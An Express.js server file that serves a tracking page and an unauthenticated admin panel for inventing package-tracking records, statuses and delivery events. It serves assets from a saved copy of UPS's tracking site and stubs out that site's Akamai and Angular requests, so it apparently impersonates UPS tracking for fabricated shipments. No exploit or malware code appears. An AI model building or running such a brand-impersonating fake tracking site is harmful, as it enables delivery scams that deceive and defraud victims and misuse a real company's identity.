const express = require('express');
const path = require('path');
const axios = require('axios');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Log all requests for debugging
app.use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next();
});

// Serve the modern tracking form page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'modern-tracking.html'));
});

// Serve the admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-panel.html'));
});

// In-memory storage for tracking numbers (in a real app, this would be a database)
let trackingNumbers = [
  {
    trackingNumber: 'TRK1234567890',
    clientName: 'John Smith',
    description: 'Electronics Package',
    status: 'Delivered',
    destination: 'New York, NY',
    createdAt: '2023-12-10',
    events: [
      {
        timestamp: '2023-12-10 08:30 AM',
        location: 'Origin Facility - Los Angeles, CA',
        description: 'Package received'
      },
      {
        timestamp: '2023-12-10 02:15 PM',
        location: 'Hub - Phoenix, AZ',
        description: 'Package in transit'
      },
      {
        timestamp: '2023-12-11 06:45 AM',
        location: 'Distribution Center - New York, NY',
        description: 'Package arrived at facility'
      },
      {
        timestamp: '2023-12-11 03:30 PM',
        location: 'New York, NY',
        description: 'Package delivered'
      }
    ]
  },
  {
    trackingNumber: 'TRK0987654321',
    clientName: 'Sarah Johnson',
    description: 'Clothing Package',
    status: 'In Transit',
    destination: 'Chicago, IL',
    createdAt: '2023-12-12',
    events: [
      {
        timestamp: '2023-12-12 09:15 AM',
        location: 'Origin Facility - Miami, FL',
        description: 'Package received'
      },
      {
        timestamp: '2023-12-12 04:30 PM',
        location: 'Hub - Atlanta, GA',
        description: 'Package in transit'
      },
      {
        timestamp: '2023-12-13 08:20 AM',
        location: 'Hub - Nashville, TN',
        description: 'Package in transit'
      }
    ]
  },
  {
    trackingNumber: 'TRK1122334455',
    clientName: 'Michael Brown',
    description: 'Home Goods',
    status: 'Pending',
    destination: 'Seattle, WA',
    createdAt: '2023-12-14',
    events: [
      {
        timestamp: '2023-12-14 10:00 AM',
        location: 'Origin Facility - Dallas, TX',
        description: 'Package received'
      }
    ]
  }
];

// API endpoint for tracking packages
app.post('/api/track', async (req, res) => {
  try {
    const { trackingNumber } = req.body;
    
    console.log('Tracking request received for:', trackingNumber);
    
    // Find the tracking number in our storage
    const trackingData = trackingNumbers.find(t => t.trackingNumber === trackingNumber);
    
    console.log('Tracking data found:', trackingData);
    
    if (trackingData) {
      res.json(trackingData);
    } else {
      console.log('Tracking number not found in storage:', trackingNumbers.map(t => t.trackingNumber));
      res.status(404).json({ error: 'Tracking number not found' });
    }
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).json({ error: 'Failed to track package' });
  }
});

// API endpoint to get all tracking numbers (for admin panel)
app.get('/api/tracking-numbers', (req, res) => {
  res.json(trackingNumbers);
});

// API endpoint to generate a new tracking number (for admin panel)
app.post('/api/generate-tracking', (req, res) => {
  try {
    const { clientName, description, destination } = req.body;
    
    // Generate a random tracking number
    const trackingNumber = 'TRK' + Math.floor(1000000000 + Math.random() * 9000000000);
    
    // Create new tracking entry
    const newTracking = {
      trackingNumber,
      clientName,
      description,
      destination,
      status: 'Pending',
      createdAt: new Date().toISOString().split('T')[0],
      events: [
        {
          timestamp: new Date().toLocaleString(),
          location: 'Origin Facility',
          description: 'Package received'
        }
      ]
    };
    
    // Add to our storage
    trackingNumbers.push(newTracking);
    
    res.json(newTracking);
  } catch (error) {
    console.error('Generate tracking error:', error);
    res.status(500).json({ error: 'Failed to generate tracking number' });
  }
});

// API endpoint to update tracking information (for admin panel)
app.put('/api/update-tracking', (req, res) => {
  try {
    const { trackingNumber, clientName, description, destination, status, newEvent } = req.body;
    
    // Find the tracking number in our storage
    const index = trackingNumbers.findIndex(t => t.trackingNumber === trackingNumber);
    
    if (index === -1) {
      return res.status(404).json({ error: 'Tracking number not found' });
    }
    
    // Update the tracking information
    trackingNumbers[index].clientName = clientName;
    trackingNumbers[index].description = description;
    trackingNumbers[index].destination = destination;
    trackingNumbers[index].status = status;
    
    // Add new event if provided
    if (newEvent) {
      trackingNumbers[index].events.push({
        timestamp: new Date().toLocaleString(),
        location: newEvent.location,
        description: newEvent.description
      });
    }
    
    res.json({ message: 'Tracking information updated successfully', tracking: trackingNumbers[index] });
  } catch (error) {
    console.error('Update tracking error:', error);
    res.status(500).json({ error: 'Failed to update tracking information' });
  }
});

// API endpoint to delete a tracking number (for admin panel)
app.delete('/api/tracking-numbers/:trackingNumber', (req, res) => {
  try {
    const { trackingNumber } = req.params;
    
    // Find the index of the tracking number
    const index = trackingNumbers.findIndex(t => t.trackingNumber === trackingNumber);
    
    if (index !== -1) {
      // Remove from our storage
      trackingNumbers.splice(index, 1);
      res.json({ message: 'Tracking number deleted successfully' });
    } else {
      res.status(404).json({ error: 'Tracking number not found' });
    }
  } catch (error) {
    console.error('Delete tracking error:', error);
    res.status(500).json({ error: 'Failed to delete tracking number' });
  }
});

// Handle special redirects for missing scripts in the /scripts directory
app.get('/scripts/:scriptName.js', (req, res) => {
  const scriptName = req.params.scriptName;
  const possibleFiles = [
    `Tracking _ UPS - United States_files/${scriptName}.js.download`,
    `Tracking _ UPS - United States_files/${scriptName}.js`,
    `Tracking _ UPS - United States_files/${scriptName}`
  ];
  
  for (const file of possibleFiles) {
    try {
      const fullPath = path.join(__dirname, file);
      if (fs.existsSync(fullPath)) {
        res.setHeader('Content-Type', 'application/javascript');
        return res.sendFile(fullPath);
      }
    } catch (err) {
      // Continue to next option
    }
  }
  
  // If not found, send a minimal empty response
  res.setHeader('Content-Type', 'application/javascript');
  res.send('// Script not found');
});

// Handle font requests
app.get('/fonts/:fontName', (req, res) => {
  // Try to serve from the UPS files directory
  const fontPath = path.join(__dirname, 'Tracking _ UPS - United States_files', req.params.fontName);
  try {
    if (fs.existsSync(fontPath)) {
      // Determine content type based on extension
      const ext = path.extname(req.params.fontName).toLowerCase();
      if (ext === '.woff' || ext === '.woff2') {
        res.setHeader('Content-Type', 'font/woff2');
      } else if (ext === '.ttf') {
        res.setHeader('Content-Type', 'font/ttf');
      } else {
        res.setHeader('Content-Type', 'application/octet-stream');
      }
      return res.sendFile(fontPath);
    }
  } catch (err) {
    // Continue to send empty response
  }
  
  // Send empty response for missing fonts
  res.setHeader('Content-Type', 'application/octet-stream');
  res.send('');
});

// Handle missing image requests
app.get('/track/assets/resources/images/:imageName', (req, res) => {
  // Send empty response for missing images
  const ext = path.extname(req.params.imageName).toLowerCase();
  if (ext === '.gif') {
    res.setHeader('Content-Type', 'image/gif');
  } else if (ext === '.png') {
    res.setHeader('Content-Type', 'image/png');
  } else if (ext === '.jpg' || ext === '.jpeg') {
    res.setHeader('Content-Type', 'image/jpeg');
  } else {
    res.setHeader('Content-Type', 'image/gif');
  }
  res.send('');
});

// Handle akamai service worker
app.get('/akam-sw.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send('// Akamai service worker');
});

// Handle QjwuOnpoAQ requests (these seem to be Angular related)
app.get('/Tracking _ UPS - United States_files/QjwuOnpoAQ', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send('// Angular initialization script');
});

app.post('/Tracking _ UPS - United States_files/QjwuOnpoAQ', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.send('{}');
});

// Serve static files from the UPS files directory with proper MIME types
app.use('/Tracking _ UPS - United States_files', express.static('Tracking _ UPS - United States_files', {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js') || filePath.endsWith('.js.download')) {
      res.setHeader('Content-Type', 'application/javascript');
    } else if (filePath.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css');
    } else if (filePath.endsWith('.svg')) {
      res.setHeader('Content-Type', 'image/svg+xml');
    } else if (filePath.endsWith('.woff') || filePath.endsWith('.woff2')) {
      res.setHeader('Content-Type', 'font/woff2');
    } else if (filePath.endsWith('.ttf')) {
      res.setHeader('Content-Type', 'font/ttf');
    } else if (filePath.endsWith('.gif')) {
      res.setHeader('Content-Type', 'image/gif');
    } else if (filePath.endsWith('.png')) {
      res.setHeader('Content-Type', 'image/png');
    } else if (filePath.endsWith('.jpg') || filePath.endsWith('.jpeg')) {
      res.setHeader('Content-Type', 'image/jpeg');
    }
  }
}));

// Handle requests with encoded spaces
app.use('/Tracking%20_%20UPS%20-%20United%20States_files', express.static('Tracking _ UPS - United States_files', {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js') || filePath.endsWith('.js.download')) {
      res.setHeader('Content-Type', 'application/javascript');
    } else if (filePath.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css');
    } else if (filePath.endsWith('.svg')) {
      res.setHeader('Content-Type', 'image/svg+xml');
    } else if (filePath.endsWith('.woff') || filePath.endsWith('.woff2')) {
      res.setHeader('Content-Type', 'font/woff2');
    } else if (filePath.endsWith('.ttf')) {
      res.setHeader('Content-Type', 'font/ttf');
    } else if (filePath.endsWith('.gif')) {
      res.setHeader('Content-Type', 'image/gif');
    } else if (filePath.endsWith('.png')) {
      res.setHeader('Content-Type', 'image/png');
    } else if (filePath.endsWith('.jpg') || filePath.endsWith('.jpeg')) {
      res.setHeader('Content-Type', 'image/jpeg');
    }
  }
}));

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  console.log(`Tracking page available at http://localhost:${PORT}`);
  console.log(`Admin panel available at http://localhost:${PORT}/admin`);
});